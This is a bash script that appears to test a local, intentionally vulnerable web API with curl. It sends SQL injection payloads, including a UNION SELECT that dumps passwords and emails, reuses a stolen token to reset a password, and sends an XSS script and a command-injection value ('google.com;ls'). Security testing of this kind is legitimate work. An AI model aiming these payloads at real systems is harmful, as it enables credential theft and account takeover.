#!/bin/bash
   
HOST_URL=http://localhost:5600/api

# Check if the CI environment variable is set to true 
if [ -n "${CI}" ] && [ "${CI}" = "true" ]; then 
    HOST_URL=http://backend:5500/api
    DOCKER_NETWORK=zap
fi

echo "
      HOST_URL=$HOST_URL \n
      DOCKER_NETWORK=$DOCKER_NETWORK"

function test_sql_injection_registration_endpoint_with_random_data() {
    echo "------------------------------------------------"
    echo "------------------------------------------------\n"
    echo "Testing SQL Injection by passing default data validation to access the registration endpoint\n"
    echo "curl -X POST $HOST_URL/client_registeration -H 'Content-Type: application/json' -d '{\"fullName\":\"John Doe$RANDOM\",\"userName\":\"JohnDoe AND 1=2 -- \",\"email\":\"JohnDoe@dropmail.cc\",\"password\":\"JohnDoe1234\",\"phone\":\"1234567890\"}' \n"

    curl -X POST $HOST_URL/client_registeration -H 'Content-Type: application/json' -d "{\"fullName\":\"JohnDoe$RANDOM\",\"userName\":\"JohnDoe$RANDOM AND 1=2 -- \",\"email\":\"JohnDoe$RANDOM@dropmail.cc\",\"password\":\"JohnDoe1234\",\"phone\":\"1234567890\"}"

}

function test_sql_injection_login_endpoint_with_random_data() {
    echo "------------------------------------------------"
    echo "------------------------------------------------\n"
    echo "Testing SQL Injection by passing default data validation to access the login endpoint\n"
    echo "curl -X POST $HOST_URL/client_login -H 'Content-Type: application/json' -d '{\"userName\":\"spammer\",\"email\":\"spammer@dropmail.cc \\\" OR 1=1 --;\",\"password\":\"johndoe1234\"}'\n"
    curl -X POST $HOST_URL/client_login -H 'Content-Type: application/json' -d '{"userName":"spammer","email":"spammer@dropmail.cc \" OR 1=1 --; ","password":"johndoe1234"}'
}


function test_sql_injection_to_retrieve_account_details() {
    echo "------------------------------------------------"
    echo "------------------------------------------------\n"
    echo "Testing SQL Injection to retrieve account details\n"
    echo "curl -X POST $HOST_URL/client_login -H 'Content-Type: application/json' -d '{ \"userName\": \"spammer\" , \"email\": \"spam@email.com\" union select password || \":\" || email from users;--\" , \"password\": \"pwd1234\" }'\n"
    
    # can retrieve the existing account login details using the below query
    jwt() { jq -R 'split(".") | .[1] | @base64d | fromjson' <<< $1; }

    auth_token=$(curl -X POST $HOST_URL/client_login -H 'Content-Type: application/json' -d '{ "userName": "spammer" , "email": "spam@email.com\" union select password || \":\" || email from users;--" , "password": "pwd" }' | jq -j '.token')
    jwt $auth_token
    json=$(jwt $auth_token)
    password=$(echo "$json" | jq -r '.role' | cut -d':' -f1)
    export password=$password
    export auth_token=$auth_token
    echo $auth_token
}

function test_jwt_verification_disabled() {
    echo "------------------------------------------------"
    echo "------------------------------------------------\n"
    echo "Testing Resetting the password of the retrieved account\n"
    echo "curl -X POST $HOST_URL/update_info -H 'Content-Type: application/json' -d { \"token\": \"$auth_token\" , \"currentPassword\": \"pwd\" , \"newPassword\": \"newpass\" }'\n"
    
    # local token=test_sql_injection_to_retrieve_account_details
    curl -X POST $HOST_URL/update_info -H 'Content-Type: application/json' -d "{ \"token\": \"$auth_token\" , \"currentPassword\": \"pwd\" , \"newPassword\": \"newpass\" }"

}

function test_input_validation() {
    echo "------------------------------------------------"
    echo "------------------------------------------------\n"
    echo "Testing Input Validation\n"
    echo "curl -X POST $HOST_URL/client_registeration -H 'Content-Type: application/json' -d \"{ \"fullName\": \"<script>alert('XSS')</script>\", \"userName\": \"testuser\", \"email\": \"test$RANDOM@example.com\", \"password\": \"test\", \"phone\": \"1234567890\" }\" \n"
    
    curl -X POST $HOST_URL/client_registeration -H 'Content-Type: application/json' -d "{ \"fullName\": \"<script>alert('XSS')</script>\", \"userName\": \"testuser\", \"email\": \"test$RANDOM@example.com\", \"password\": \"test\", \"phone\": \"1234567890\" }"
}

function test_insecure_use_of_ping() {
    echo "------------------------------------------------"
    echo "------------------------------------------------\n"
    echo "Testing Insecure Use of Ping\n"
    echo "curl -X GET $HOST_URL/products -d 'source=google.com;ls'\n"

    curl -X GET $HOST_URL/products -d 'source=google.com;ls'

}

function test_weak_error_message() {
    echo "------------------------------------------------"
    echo "------------------------------------------------"
    echo "Testing Weak Error Message\n"
    echo "curl -X POST $HOST_URL/client_login -H 'Content-Type: application/json' -d '{ \"email\": \"nonexistent@example.com\" , \"password\": \"wrongpassword\" }'\n"
    curl -X POST $HOST_URL/client_login -H 'Content-Type: application/json' -d '{ "email": "nonexistent@example.com" , "password": "wrongpassword" }'
}

test_sql_injection_registration_endpoint_with_random_data
test_sql_injection_login_endpoint_with_random_data    
test_sql_injection_to_retrieve_account_details
test_jwt_verification_disabled
test_input_validation
test_insecure_use_of_ping
test_weak_error_message